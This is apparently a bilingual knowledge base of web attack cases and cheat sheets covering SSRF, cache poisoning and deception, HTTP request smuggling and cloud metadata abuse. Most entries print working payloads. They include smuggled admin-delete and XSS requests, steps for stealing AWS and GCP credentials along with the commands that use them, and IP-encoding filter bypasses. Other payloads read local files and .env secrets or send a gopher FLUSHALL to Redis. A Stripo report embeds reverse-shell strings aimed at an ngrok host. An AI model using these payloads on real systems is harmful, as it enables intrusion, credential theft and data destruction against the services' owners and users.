PoC harness (private Chutney network, attacker-patched exit relay sends real CONFLUX_SWITCH + RELAY_DATA cells, clean victim binary unmodified):
ROUNDS=4 TARGET_COUNTER=1000000 TRAFFIC_PASSES=1 TRAFFIC_TIMEOUT=35 TOR_CONFLUX_OOO_CELLS=900 TOR_CONFLUX_OOO_PROBES=60 bash ~/run-poc.sh
Observed counter growth across attack+clean-restart rounds (accounting NEVER returns to 0 despite teardown each round):
round-1-after-attack: conflux_counter=327716 | round-2: 720904 | round-3: 1441452 (>= 1,000,000 target reached) -- confirms the stale-accounting bug survives real Conflux teardown under default MaxMemInQueues.
```

**Techniques :** accounting-invariant-violation, teardown-without-cleanup, oom-pressure-primitive, protocol-level-cell-abuse

**Correspond aux classes qualifiantes :** protocol-vulnerability

---

## SSRF & Cache Attacks

*20 cas.*

### Cache Pollution via Unkeyed GET Parameters on www.omise.co

**📄 Cas réel**
[source](https://hackerone.com/reports/3183046)

The CDN in front of www.omise.co caches pages by full URL including arbitrary unrecognized GET parameters, without normalizing or restricting the cache key. Sending the same page with different unique parameter values causes each variant to be stored as a separate cache entry (confirmed via CF-Cache-Status: HIT and increasing Age), letting an attacker exhaust CDN cache storage and evict legitimate entries.

**Cause racine :** The CDN keys its cache on the full request URL, including unknown/unwhitelisted GET parameters, instead of normalizing or restricting which parameters participate in the cache key.

**Preuve technique (verbatim depuis la source) :**

```
GET /en/contact-sales?test=123 HTTP/2
Host: www.omise.co
-> response headers: CF-Cache-Status: HIT, Age: <increasing>

GET /en/contact-sales?abc=456 HTTP/2
Host: www.omise.co
-> ALSO cached independently, its own CF-Cache-Status: HIT + fresh Age

Same result again with /en/contact-sales?polluted_param= -- every distinct, never-seen-before GET param value gets its own permanent cache slot on an identical page, because the CDN keys on the full URL instead of normalizing/whitelisting which params matter.
```

**Techniques :** unkeyed-query-parameters, cdn-cache-key-normalization-flaw, cache-pollution, cf-cache-status-verification

**Correspond aux classes qualifiantes :** cache-poisoning

**Signal (endpoints/fonctions observés) :**
- `/en/contact-sales?test=123`
- `/en/contact-sales?polluted_param=`

**Paramètres impliqués :** `test`, `abc`, `polluted_param`

---

### HTTP Request Smuggling Cheat Sheet

**🧾 Cheatsheet**

Generic cheat sheet on HTTP Request Smuggling: front-end/back-end disagreement on request boundaries via Content-Length/Transfer-Encoding or HTTP/2-to-1.1 downgrades. Covers timeout-based CL.TE/TE.CL discovery, PoC payloads for admin bypass, reflected XSS injection, victim session stealing, WAF-evasion header obfuscation, CL.0 smuggling, and HTTP/2 downgrade variants (H2.CL, H2.TE).

**Preuve technique (verbatim depuis la source) :**

```
CL.TE detection probe (front-end trusts Content-Length, back-end trusts Transfer-Encoding -> back-end hangs waiting for the chunk terminator -> timeout/500):
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1
Z
Q

TE.CL detection probe (front-end trusts TE, back-end trusts CL:6, waits for more data -> timeout):
POST /about HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X

CL.TE admin-panel bypass (smuggled request reaches localhost-only /admin):
POST / HTTP/1.1
Host: <target>
Content-Length: 104
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 17

test=test
0


CL.TE reflected XSS via smuggled next-user request:
POST / HTTP/1.1
Host: <target>
Cookie: session=h9AxO9D85az6tnm7vtLlAegYpM412Hgr
Content-Length: 123
Transfer-Encoding: chunked

0

GET /post?postId=1 HTTP/1.1
User-Agent: testing123"><script>alert(1)</script>
Content-Length: 17

test=test
0


TE obfuscation to slip past a WAF that only pattern-matches a single TE header:
POST / HTTP/1.1
Host: <target>
Transfer-Encoding: invalid
Transfer-Encoding: chunked
Content-Length: 32

0

GET /test HTTP/1.1
X: Test

TE.CL admin bypass (chunk size 5d wraps the smuggled request; back-end's smaller Content-Length:4 cuts it short, leaving the rest as a new request):
POST / HTTP/1.1
Host: <target>
Transfer-Encoding: chunked
Content-Length: 4

5d
POST /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 20

test=test
0


CL.0 (back-end static-file handler ignores Content-Length entirely, assumes 0, treats the rest of the body as a new request):
POST /resources/images/avatarDefault.svg HTTP/1.1
Host: <target>
Content-Length: 30

GET /admin HTTP/1.1
X: Test

H2.TE admin bypass (HTTP/2 downgraded to HTTP/1.1 chunked):
POST / HTTP/2
Host: <target>
Content-Length: 104
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Length: 17

test=test
0
```

**Techniques :** CL.TE desync detection (timeout-based), TE.CL desync detection, CL.TE admin panel bypass via smuggled GET, CL.TE reflected XSS via smuggled request, victim request/session stealing, Transfer-Encoding header obfuscation vs WAF, CL.0 smuggling on static endpoints, H2.CL / H2.TE smuggling via CRLF injection on HTTP/2 downgrade

**Correspond aux classes qualifiantes :** http-smuggling, xss, auth-bypass, account-takeover

---

### Massive Data Leak via Web Cache Deception

**📄 Cas réel**
sévérité : critical · CWE-524 · [source](https://academy.logicalbreach.com/writeups/en-massive-data-leak-via-web-cache-deception-85005932-47d6-4d7b-9a44-39662226a148)

An IoT platform's CDN decided cacheability purely by the URL's final file extension. Appending a fake ';.css' suffix to dynamic authenticated JSON endpoints made the CDN cache the personalized JSON response publicly. Chained with an Open Redirect in the logout flow, an attacker could force a logged-in victim's browser to hit their private endpoint with the ';.css' suffix, causing the CDN to permanently store the victim's private data (emails, device serials, camera locations) for anyone to retrieve unauthenticated.

**Cause racine :** The CDN classifies a response as cacheable static content purely by the requested URL's trailing file extension, so appending a fake static extension to a dynamic authenticated endpoint tricks it into publicly caching a personalized response.

**Preuve technique (verbatim depuis la source) :**

```
Core trick: append ;.css to any DYNAMIC, per-user JSON endpoint -- app server processes the request and ignores the suffix, but the CDN classifies cacheability purely by trailing extension and stores the personalized response as if it were a static stylesheet:
https://api.smart-home-platform.net/account/getDashboardLayout.json  -- (normal, not cached)
https://api.smart-home-platform.net/account/getDashboardLayout.json;.css  -- (CDN caches it PUBLICLY)

Full chain, forcing a specific victim's private endpoint into the public cache via an Open Redirect on the logout flow:
1) Malicious link built against the trusted logout domain, redirect target = victim's own private email endpoint + ;.css:
https://auth.smart-home-platform.net/logout?returnUrl=https://api.smart-home-platform.net/user/getPrivateEmail.json;.css
2) Victim (active session) clicks it -> browser follows the open redirect -> hits their OWN /user/getPrivateEmail.json;.css while authenticated -> origin returns 200 with their real email in JSON -> CDN stores it publicly under that exact URL, believing it's caching CSS.
3) Attacker, unauthenticated/incognito, requests the SAME URL -> CDN serves the cached victim JSON straight from cache, no auth needed.
Other endpoints confirmed exploitable the same way: /alarmlogs/getUncheckedLogs;.css (full alarm log enumeration), /iot-service/findAllDevices;.css (camera/device serials + UUIDs).
```

**Techniques :** web-cache-deception, extension-based-cdn-cache-classification-abuse, open-redirect-chaining-to-force-victim-request, public-cache-poisoning-of-authenticated-json

**Correspond aux classes qualifiantes :** cache-poisoning, open-redirect

**Signal (endpoints/fonctions observés) :**
- `/account/getDashboardLayout.json;.css`
- `/user/getPrivateEmail.json;.css`
- `/iot-service/findAllDevices;.css`

**Paramètres impliqués :** `returnUrl`

---

### Blind SSRF Vulnerability in Stripo App Export via Missing Endpoints Export Email Message to Zapier

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/2932960)

Stripo's export service endpoint accepts a user-controlled webhookUrl field and issues an outbound HTTP POST to it when processing the export/webhook configuration. Blind SSRF confirmed by pointing webhookUrl at an ngrok listener and observing the server-originated request arrive out-of-band, proving arbitrary server-side requests can be triggered — potentially reaching internal services or cloud metadata.

**Cause racine :** The webhook export endpoint sends a server-side HTTP request to the attacker-supplied webhookUrl value without validating or restricting the destination host/IP.

**Preuve technique (verbatim depuis la source) :**

```
curl -i -X POST 'https://my.stripo.email/bapi/exportservice/v3/exports/WEBHOOK/accounts/52027412' \
--data '{
  "id": 52027412,
  "name": "sh -i & devtcp192.168.100.3 0&1",
  "oAuthRequired": false,
  "authLink": null,
  "draft": false,
  "destination": "WEBHOOK",
  "properties": {
    "headers": [{"name": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1", "value": "sh -i >& /dev/tcp/192.168.100.3/9001 0>&1"}],
    "accountName": "sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookUrl": "https://cd7c-101-255-157-9.ngrok-free.app/sh -i & devtcpbe7e-101-255-157-9.ngrok-free.app9001 0&1",
    "webhookType": "CUSTOM"
  },
  "public": false
}'

Resulting server-originated request observed on the attacker's ngrok listener, confirming blind SSRF (server itself issued the outbound HTTP call to the attacker-controlled webhookUrl):
POST /webhook/sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.3%2F9001%200%3E%261/ HTTP/1.1
Host: 5290-101-255-157-9.ngrok-free.app
User-Agent: Apache-HttpClient/4.5.14 (Java/21.0.5)
X-Forwarded-For: 54.247.167.106
X-Forwarded-Host: 5290-101-255-157-9.ngrok-free.app
X-Forwarded-Proto: https
```

**Techniques :** blind-ssrf-via-webhook-url-parameter, out-of-band-callback-confirmation-ngrok, server-side-outbound-request-forgery-on-export-service

**Correspond aux classes qualifiantes :** ssrf

**Signal (endpoints/fonctions observés) :**
- `/exportservice/v3/exports/WEBHOOK/accounts`

**Paramètres impliqués :** `webhookUrl`, `webhookType`, `accountName`, `headers`

---

### SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)

**📄 Cas réel**
[source](https://hackerone.com/reports/3634400)

The ssrf_filter Ruby gem blocks the well-known NAT64 prefix 64:ff9b::/96 but fails to block the separate NAT64 local-use prefix 64:ff9b:1::/48. Binding a test service inside the unblocked local-use prefix and requesting it through the library's proxy showed it classified as 'allowed' and reachable, while the same address under the well-known prefix was correctly blocked — an SSRF bypass to internal/loopback-equivalent targets when that range is routable.

**Cause racine :** ssrf_filter's IPv6 blacklist only lists the well-known NAT64 prefix and omits the NAT64 local-use prefix, so addresses in that unlisted range are treated as public and safe.

**Preuve technique (verbatim depuis la source) :**

```
Root cause (github.com/arkadiyt/ssrf_filter):
lib/ssrf_filter/ssrf_filter.rb#L47-L59: IPV6_BLACKLIST includes 64:ff9b::/96 but NOT 64:ff9b:1::/48 (the separate NAT64 local-use prefix).
lib/ssrf_filter/ssrf_filter.rb#L139-L143: unsafe_ip_address? decides safety ONLY via blacklist membership -- the missing prefix is treated as public/safe.
lib/ssrf_filter/ssrf_filter.rb#L126-L127: resolver output filtered with that same function, so unblocked NAT64 local-use addresses pass straight into public_addresses.

Control (blocked, well-known prefix):
curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b::7f00:1]:18081'
{"status":"blocked","error":"SsrfFilter::PrivateIPAddress","message":"Hostname '64:ff9b::7f00:1' has no public ip addresses"}

Bypass (unblocked local-use prefix, same underlying loopback target 127.0.0.1 encoded via NAT64):
curl -sS 'http://localhost:4568/fetch?url=http://[64:ff9b:1::7f00:1]:18081'
{"status":"allowed","code":"200","headers":{"content-type":"text/plain","content-length":"24","connection":"close"},"body":"NAT64_PREFIX_BYPASS_DEMO"}

Test server bound to the unblocked prefix (for reference, minimal Ruby TCP server):
server = TCPServer.new("64:ff9b:1::7f00:1", 18081)
loop do
  sock = server.accept
  while (line = sock.gets); break if line == "\r\n"; end
  sock.write("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 24\r\nConnection: close\r\n\r\nNAT64_PREFIX_BYPASS_DEMO")
  sock.close
end
```

**Techniques :** ipv6-blacklist-gap-bypass, nat64-local-use-prefix-64:ff9b:1::/48, loopback-equivalent-address-binding, ssrf-filter-ruby-gem-bypass

**Correspond aux classes qualifiantes :** ssrf

**Signal (endpoints/fonctions observés) :**
- `/fetch?url=http://[64:ff9b:1::7f00:1]:18081`

**Paramètres impliqués :** `url`

---

### SSRF via Improper Redirect Validation in Rocket.Chat oEmbed Function

**📄 Cas réel**
[source](https://hackerone.com/reports/3383079)

Rocket.Chat's oEmbed preview feature validates the initially posted URL to block local/internal IPs, but never re-validates the URL after following an HTTP redirect to its final destination. Posting a shortened URL that redirects to an internal-network host causes the server to follow the redirect and generate a preview from the internal target — the same technique could reach cloud metadata endpoints such as AWS IMDS.

**Cause racine :** SSRF protection checks only the originally posted URL for local/internal IPs and does not validate the URL(s) reached after following redirects.

**Preuve technique (verbatim depuis la source) :**

```
Test target: internal httpbin at 192.168.100.9:8080, unreachable directly by the attacker.
Direct post of http://192.168.100.9:8080 -> SSRF guard correctly BLOCKS preview (local IP filter works on the initially-posted URL).
Post a URL-shortener link that redirects to that same internal IP (https://tinyurl.com/bdhdhmrn -> http://192.168.100.9:8080): Rocket.Chat follows the 302, oEmbed generates a preview from the internal target's response -> confirms the redirect destination is NEVER re-validated, only the originally-posted URL is checked. Same class of bypass usable against cloud metadata endpoints (AWS IMDS).
```

**Techniques :** redirect-based-ssrf-bypass, url-shortener-chaining, oembed-preview-abuse, internal-network-scanning

**Correspond aux classes qualifiantes :** ssrf

---

### SSRF via Improper Validation After DNS Name Resolution in the Link-Preview Feature

**📄 Cas réel**
[source](https://hackerone.com/reports/3393664)

Rocket.Chat's link-preview feature checks whether the hostname of a posted URL resolves to a local/internal IP before generating a preview, but this check happens before DNS resolution, and the resulting IP is never validated. Registering a domain pointed at an internal IP (e.g. via a dynamic DNS provider) and posting it caused the server to resolve and fetch the internal host, displaying part of its response as a preview.

**Cause racine :** The hostname is validated against local/internal IP ranges before DNS resolution, but the IP address actually returned by resolution is never re-validated before the server connects to it.

**Preuve technique (verbatim depuis la source) :**

```
Test target: internal httpbin at 192.168.100.14:80.
Direct post of http://192.168.100.14 -> blocked (hostname/IP-literal correctly filtered pre-resolution).
Attacker registers a public domain pointed at the internal IP via a dynamic-DNS provider (e.g. noip.com): *.conamikan.servegame.com -> 192.168.100.14. Posting http://test.conamikan.servegame.com passes the pre-resolution hostname check (it's not a raw local IP), Rocket.Chat then resolves the DNS name AFTER the check and connects to 192.168.100.14 -- preview displayed from the internal host. Confirms the IP address returned by DNS resolution is never re-validated post-lookup (classic DNS-rebinding-style bypass, no actual rebinding/TTL trick needed since the record is static).
```

**Techniques :** dns-rebinding-style-bypass, hostname-only-validation, link-preview-abuse, internal-network-scanning

**Correspond aux classes qualifiantes :** ssrf

---

### Vol de credentials IAM via SSRF vers l'endpoint de métadonnées AWS IMDSv1

**🧾 Cheatsheet**
sévérité : critical · CWE-918

Toute SSRF sur une infrastructure AWS (même une simple SSRF 'aveugle' capable seulement de déclencher une requête GET) peut être escaladée en vol complet des credentials IAM temporaires du rôle attaché à l'instance EC2/conteneur, via l'endpoint de métadonnées interne 169.254.169.254 -- accessible sans authentification depuis l'intérieur du réseau de l'instance sur IMDSv1 (toujours activé par défaut sur beaucoup d'anciennes instances malgré la recommandation AWS de forcer IMDSv2).

**Cause racine :** L'endpoint de métadonnées d'instance cloud est accessible sans authentification depuis n'importe quel processus/requête originant du réseau local de l'instance, et l'application vulnérable à la SSRF fait une requête HTTP vers une URL en partie ou totalement contrôlée par l'utilisateur sans bloquer la plage d'adresses link-local (169.254.0.0/16).

**Preuve technique (verbatim depuis la source) :**

```
Étape 1 -- lister les rôles IAM disponibles via le paramètre SSRF de l'application cible :
GET /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Réponse : nom du rôle, ex: "ec2-app-role"

Étape 2 -- récupérer les credentials temporaires complets de ce rôle :
GET /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role
# Réponse JSON : {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}

Étape 3 -- utiliser directement ces credentials avec l'AWS CLI :
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls  # ou toute action que le rôle autorise (souvent bien plus large que nécessaire)
```

**Techniques :** aws-imds-v1-abuse, iam-role-credential-theft

**Correspond aux classes qualifiantes :** ssrf, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/`

**Paramètres impliqués :** `url`

---

### Contourner la protection IMDSv2 (token PUT) via une SSRF permettant de contrôler la méthode HTTP

**🧾 Cheatsheet**
sévérité : high · CWE-918

IMDSv2 exige une requête PUT préalable pour obtenir un jeton de session avant de pouvoir lire les métadonnées via GET -- une défense normalement efficace contre une SSRF classique qui ne peut forcer qu'un GET. Mais certaines SSRF via des bibliothèques HTTP côté serveur qui suivent des redirections 307 (qui préservent la méthode HTTP d'origine, contrairement à 301/302) permettent, si l'attaquant contrôle un serveur intermédiaire vers lequel l'app fait une requête PUT légitime (ex: un webhook custom), de rediriger cette PUT vers IMDSv2 et d'en récupérer le token.

**Cause racine :** IMDSv2 protège contre une SSRF basique en exigeant une méthode PUT peu commune, mais une application qui effectue elle-même des requêtes PUT sortantes vers une URL configurable (ex: un endpoint de webhook custom, une API de synchronisation) et suit les redirections HTTP 307 sans revalider la destination expose la même surface qu'une SSRF GET classique.

**Preuve technique (verbatim depuis la source) :**

```
Configuration d'un endpoint webhook custom pointant vers un serveur attaquant qui répond par une redirection 307 vers IMDSv2 :
POST /settings/webhook HTTP/1.1
Content-Type: application/json

{"webhook_url":"https://attacker.example.com/redirect-put"}

Réponse du serveur attaquant à la requête PUT sortante de l'application :
HTTP/1.1 307 Temporary Redirect
Location: http://169.254.169.254/latest/api/token

# La bibliothèque HTTP cliente (ex: certaines configs de requests/urllib3, axios) suit le 307
# en PRÉSERVANT la méthode PUT et les headers -- si l'app envoyait un header custom
# `X-aws-ec2-metadata-token-ttl-seconds: 21600` sur sa requête webhook (improbable mais
# certains frameworks forwardent tous les headers), le token IMDSv2 est retourné directement
# dans la réponse que l'app relaie ou log.
```

**Techniques :** imdsv2-put-request-smuggling, ssrf-method-control

**Correspond aux classes qualifiantes :** ssrf

**Signal (endpoints/fonctions observés) :**
- `http://169.254.169.254/latest/api/token`

**Paramètres impliqués :** `url`, `method`

---

### Vol de token de compte de service GCP via SSRF (en-tête Metadata-Flavor requis)

**🧾 Cheatsheet**
sévérité : critical · CWE-918

Équivalent GCP de l'attaque IMDS AWS -- mais Google exige la présence de l'en-tête `Metadata-Flavor: Google` sur la requête, une protection PARTIELLE contre les SSRF simples qui ne permettent pas de contrôler les en-têtes. Si l'application vulnérable transmet un en-tête personnalisé configurable par l'utilisateur (ex: un proxy générique, un fetcher de flux RSS qui accepte des headers custom), cette protection tombe entièrement.

**Cause racine :** La protection Metadata-Flavor de GCP repose uniquement sur la présence d'un en-tête HTTP, contournable dès que la SSRF permet à l'attaquant de spécifier des en-têtes arbitraires sur la requête sortante -- une capacité fréquente sur les fonctionnalités 'proxy'/'webhook test'/'import depuis une URL'.

**Preuve technique (verbatim depuis la source) :**

```
Si l'application permet de spécifier des en-têtes custom (ex: fonctionnalité de test de webhook qui accepte des headers arbitraires) :
POST /webhook/test HTTP/1.1
Content-Type: application/json

{
  "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  "headers": {"Metadata-Flavor": "Google"}
}

Réponse (si vulnérable), un token OAuth2 valide pour le compte de service de l'instance :
{"access_token":"ya29.c.Kp8B...","expires_in":3599,"token_type":"Bearer"}

Utilisation directe :
curl -H "Authorization: Bearer ya29.c.Kp8B..." https://www.googleapis.com/storage/v1/b?project=<project-id>
```

**Techniques :** gcp-metadata-abuse, metadata-flavor-header-requirement

**Correspond aux classes qualifiantes :** ssrf, privilege-escalation

**Signal (endpoints/fonctions observés) :**
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`

**Paramètres impliqués :** `url`

---

### DNS Rebinding — contourner une validation d'IP faite AVANT résolution vs la connexion réelle APRÈS

**🧾 Cheatsheet**
sévérité : high · CWE-350

Un filtre SSRF qui résout le nom de domaine, vérifie que l'IP obtenue n'est pas privée, PUIS refait une résolution DNS séparée au moment de la connexion réelle (comportement par défaut de nombreuses bibliothèques HTTP qui ne réutilisent pas l'IP déjà résolue) est vulnérable au DNS rebinding : un domaine attaquant configuré avec un TTL DNS très court (0-1s) répond une IP publique légitime à la PREMIÈRE résolution (celle du filtre) puis une IP interne (127.0.0.1, 10.x.x.x) à la SECONDE résolution (celle de la connexion réelle), quelques centaines de ms plus tard.

**Cause racine :** Le filtre SSRF valide l'adresse IP résolue à un instant T mais la bibliothèque HTTP effectue une résolution DNS INDÉPENDANTE au moment de la connexion réelle, créant une fenêtre TOCTOU exploitable par un serveur DNS attaquant qui change sa réponse entre les deux résolutions.

**Preuve technique (verbatim depuis la source) :**

```
Outils dédiés : rbndr.us (service DNS rebinding public, alterne 2 IPs configurées à chaque résolution), ou DNS Rebinding Toolkit (singularity/dnsrebind).
Configuration type via rbndr.us (encode les 2 IPs en hex dans le sous-domaine) :
url = "http://7f000001.c0a80101.rbndr.us/"  # alterne entre 127.0.0.1 et 192.168.1.1

PoC minimal côté serveur DNS attaquant (réponse TTL=0, alterne à chaque requête) :
; Résolution 1 (vue par le filtre SSRF) : 
ssrf-target.attacker.com.  0  IN  A  1.2.3.4        ; IP publique légitime
; Résolution 2 (quelques ms après, vue par la lib HTTP au moment de connect()) :
ssrf-target.attacker.com.  0  IN  A  169.254.169.254 ; IMDS ou toute cible interne

Envoi vers l'app cible :
POST /fetch-preview HTTP/1.1
Content-Type: application/json

{"url":"http://ssrf-target.attacker.com/latest/meta-data/"}
```

**Techniques :** dns-rebinding, ttl-zero-double-resolution

**Correspond aux classes qualifiantes :** ssrf

**Paramètres impliqués :** `url`

---

### Bypass de filtre SSRF via encodages alternatifs d'adresse IP (décimal, octal, hexadécimal)

**🧾 Cheatsheet**
sévérité : medium · CWE-918

Un filtre SSRF qui compare la valeur textuelle de l'IP (`127.0.0.1`, `10.0.0.1`) contre une liste noire de chaînes échoue face aux représentations alternatives, parfaitement valides pour les résolveurs réseau des systèmes d'exploitation (via inet_aton et équivalents) mais jamais matchées par une regex naïve : notation décimale (un seul entier 32-bit), octale (préfixe 0), hexadécimale (préfixe 0x), ou même mixte.

**Cause racine :** Le filtre SSRF compare une chaîne de caractères contre une liste de plages IP connues au format décimal-pointé standard, sans normaliser d'abord la valeur via un vrai parseur d'adresse réseau qui accepterait les mêmes formats alternatifs que le système d'exploitation sous-jacent.

**Preuve technique (verbatim depuis la source) :**

```
127.0.0.1 sous ses différentes formes équivalentes acceptées par la plupart des piles réseau :
Décimal (32-bit) : http://2130706433/
Octal : http://0177.0.0.1/  ou  http://017700000001/
Hexadécimal : http://0x7f000001/  ou  http://0x7f.0x0.0x0.0x1/
Mixte : http://0x7f.0.0.1/
Avec un zéro superflu par octet (parfois traité comme octal implicite) : http://127.0.0.01/

Équivalent pour 169.254.169.254 (IMDS AWS) :
Décimal : http://2852039166/
Hexadécimal : http://0xa9fea9fe/

Test systématique : envoyer chaque variante sur le paramètre SSRF cible et observer si l'une d'elles atteint effectivement la ressource interne malgré le filtre.
```

**Techniques :** ip-decimal-encoding, ip-octal-encoding, ip-hex-encoding, ip-mixed-encoding

**Correspond aux classes qualifiantes :** ssrf

**Paramètres impliqués :** `url`

---

### Chaîner un Open Redirect sur un domaine de confiance pour contourner une allowlist SSRF

**🧾 Cheatsheet**
sévérité : high · CWE-918

Une allowlist SSRF stricte ('n'accepter que des URLs vers *.trusted-partner.com') tombe si le domaine autorisé lui-même héberge un open redirect (fréquent : liens de tracking, `/redirect?to=`, SSO) -- l'attaquant fournit une URL du domaine de confiance qui redirige immédiatement vers sa cible interne réelle, et si la bibliothèque HTTP côté serveur suit les redirections automatiquement (comportement par défaut de la plupart des clients HTTP), la requête finale atteint la cible interne malgré une validation initiale parfaitement correcte sur l'URL de départ.

**Cause racine :** La validation de l'allowlist SSRF ne s'applique qu'à l'URL FOURNIE initialement, pas à chaque URL de la chaîne de redirections suivie automatiquement par la bibliothèque HTTP cliente.

**Preuve technique (verbatim depuis la source) :**

```
Domaine autorisé (trusted-partner.com) possédant un open redirect connu sur son propre endpoint de tracking :
https://trusted-partner.com/track?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

Soumis tel quel au paramètre SSRF de l'app cible qui valide bien que le domaine de départ est dans l'allowlist :
POST /import-from-url HTTP/1.1
Content-Type: application/json

{"url":"https://trusted-partner.com/track?redirect=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"}

# La validation passe (domaine = trusted-partner.com, autorisé). La bibliothèque HTTP
# (requests avec allow_redirects=True par défaut, par exemple) suit ensuite le 302 vers
# l'URL interne sans revalidation -- fix correct : désactiver le suivi automatique et
# revalider CHAQUE Location de redirection contre l'allowlist avant de la suivre.
```

**Techniques :** open-redirect-ssrf-chain, trusted-domain-redirect-abuse

**Correspond aux classes qualifiantes :** ssrf, open-redirect

**Paramètres impliqués :** `url`

---

### Lecture de fichier local via le schéma file:// accepté par un validateur d'URL SSRF trop permissif

**🧾 Cheatsheet**
sévérité : high · CWE-918

Un filtre SSRF centré uniquement sur le BLOCAGE d'adresses IP internes (127.0.0.1, 10.x.x.x, 169.254.x.x) mais qui ne restreint pas explicitement le SCHÉMA d'URL accepté (n'autorisant que http/https) laisse passer d'autres schémas supportés par la bibliothèque HTTP/URL sous-jacente -- `file://`, `gopher://`, `dict://`, `ftp://` -- chacun avec un impact différent : `file://` permet une lecture de fichier local arbitraire, sans jamais toucher le réseau donc invisible à toute détection basée sur les logs réseau sortants.

**Cause racine :** La validation SSRF s'appuie sur une liste NOIRE d'adresses IP internes plutôt qu'une liste BLANCHE de schémas d'URL autorisés (http/https uniquement), laissant passer des schémas alternatifs supportés par la bibliothèque cliente qui n'impliquent même pas de connexion réseau.

**Preuve technique (verbatim depuis la source) :**

```
Requête exploitant le schéma file:// pour lire un fichier de configuration sensible sur le serveur applicatif lui-même :
POST /fetch-remote-content HTTP/1.1
Content-Type: application/json

{"url":"file:///etc/passwd"}

Autres cibles classiques une fois le schéma confirmé fonctionnel :
{"url":"file:///app/.env"}
{"url":"file:///proc/self/environ"}
{"url":"file:///app/config/database.yml"}

Variante gopher:// pour une SSRF vers un service texte interne (ex: Redis sans authentification, exploitable pour écrire une clé arbitraire) :
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A
```

**Techniques :** file-scheme-abuse, protocol-allowlist-gap

**Correspond aux classes qualifiantes :** ssrf, lfi

**Paramètres impliqués :** `url`

---

### Détecter et confirmer une SSRF aveugle via un canal DNS out-of-band

**🧾 Cheatsheet**
sévérité : medium · CWE-918

Quand une SSRF ne renvoie AUCUNE réponse visible dans le corps HTTP (le serveur fait la requête interne mais ne relaie jamais le résultat au client -- 'SSRF aveugle'), la seule preuve d'exploitation est une interaction réseau sortante observée sur une infrastructure contrôlée par l'attaquant. Un domaine unique par cible (sous-domaine Burp Collaborator ou instance interactsh auto-hébergée) permet de confirmer avec certitude qu'une requête serveur a bien été émise, et souvent de fingerprinter l'environnement (résolveur DNS interne révélant le cloud provider, user-agent de la requête HTTP si un callback HTTP suit le DNS).

**Cause racine :** N/A — technique de détection/confirmation, pas une vulnérabilité en soi ; documente la méthode standard pour transformer une SSRF potentielle en preuve d'impact vérifiable sans accès direct à la réponse du serveur interne.

**Preuve technique (verbatim depuis la source) :**

```
Générer un sous-domaine unique par test (Burp Collaborator client, ou self-hosted interactsh) :
UNIQUE_ID=$(openssl rand -hex 8)
SSRF_URL="http://${UNIQUE_ID}.oast.fun/probe"

Soumettre au paramètre suspect :
POST /webhook/configure HTTP/1.1
Content-Type: application/json

{"callback_url":"http://${UNIQUE_ID}.oast.fun/probe"}

Vérifier ensuite les interactions reçues (API Collaborator ou dashboard interactsh) :
curl https://oast.fun/api/poll?id=${UNIQUE_ID}
# Une interaction DNS seule confirme une résolution DNS (SSRF potentielle limitée à la résolution)
# Une interaction HTTP complète confirme une vraie requête sortante avec le user-agent du serveur
# -- souvent révélateur : 'Go-http-client', 'python-requests/2.x', permettant de deviner la stack.
```

**Techniques :** oob-dns-detection, burp-collaborator-ssrf-confirmation

**Correspond aux classes qualifiantes :** ssrf

**Paramètres impliqués :** `url`

---

### SSRF/LFI via un générateur de PDF côté serveur (wkhtmltopdf, Puppeteer) rendant du HTML fourni par l'utilisateur

**🧾 Cheatsheet**
sévérité : high · CWE-918

Une fonctionnalité 'exporter en PDF' qui convertit du HTML fourni par l'utilisateur (facture personnalisable, rapport) via un moteur de rendu serveur (wkhtmltopdf, Puppeteer/Chromium headless) exécute en réalité un mini-navigateur complet côté serveur -- capable de charger `<img src="http://169.254.169.254/...">`, `<iframe src="file:///etc/passwd">`, ou d'exécuter du JavaScript qui fait ses propres requêtes `fetch()` vers des cibles internes, le tout depuis le réseau interne de l'infrastructure plutôt que depuis le navigateur de l'utilisateur.

**Cause racine :** Le moteur de rendu HTML-vers-PDF traite le contenu utilisateur comme une page web complète avec les mêmes capacités réseau qu'un navigateur (chargement d'images/iframes/scripts distants), sans sandbox réseau restreignant les schémas/destinations accessibles.

**Preuve technique (verbatim depuis la source) :**

```
HTML soumis au endpoint d'export PDF, exfiltrant le contenu d'un fichier local via une iframe puis un second appel qui l'envoie à un serveur attaquant (technique classique pour contourner le fait qu'on ne voit jamais directement le rendu, seulement le PDF final) :
<html>
<body>
<iframe src="file:///etc/passwd" style="width:1000px;height:1000px"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" style="width:500px">
</body>
</html>

Si wkhtmltopdf/Puppeteer rend ces éléments dans le PDF résultant, le contenu texte de /etc/passwd et des métadonnées IAM apparaît en clair dans le document PDF téléchargé -- exfiltration sans même avoir besoin d'un callback réseau, juste en lisant le fichier de sortie.
```

